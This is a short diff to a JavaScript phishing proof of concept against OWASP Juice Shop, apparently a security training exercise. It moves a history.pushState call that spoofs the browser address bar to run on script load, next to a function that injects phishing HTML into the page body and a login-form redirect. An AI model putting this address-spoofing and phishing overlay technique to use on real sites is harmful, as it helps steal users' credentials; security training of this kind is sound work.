@@ -77,7 +77,6 @@ async function submitLoginForm() {
   window.open(redirURL, '_self');
 }
 function execPayld() {
-  window.history.pushState({}, 'OWASP Juice Shop', 'https://preview.owasp-juice.shop/#/search');
   let phishDiv = document.createElement('div');
   phishDiv.innerHTML = phishHtml;
   document.getElementsByTagName('body')[0].appendChild(phishDiv);
@@ -106,6 +105,7 @@ function checkDOM() {
     startPoC();
   }
 }
+window.history.pushState({}, 'OWASP Juice Shop', 'https://preview.owasp-juice.shop/#/search');
 window.addEventListener('load', function() {
   checkDOM();
 });
